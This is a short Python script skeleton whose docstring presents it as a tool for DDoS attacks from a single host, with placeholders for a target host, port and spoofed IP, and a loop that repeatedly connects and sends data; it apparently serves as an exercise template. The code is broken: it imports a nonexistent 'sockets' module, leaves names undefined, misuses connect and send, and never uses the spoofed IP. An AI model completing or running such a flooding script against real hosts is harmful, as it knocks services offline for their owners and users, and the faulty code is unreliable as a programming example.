'''
Python script for performing DDoS attacks from a single host
'''

# Import needed modules.

import threading
import sockets

target_host = <target name>
target_port = <port #>
spoofed_ip = <spoofed_ip>

# Create socket object.

s = socket.socket(family=AF_INET, type=SOCK_STREAM)

'''
work through the while Loop, use documentation and previous examples.
'''

while True:
  s.connect(target_port)
  s.send(500)
  s.close()
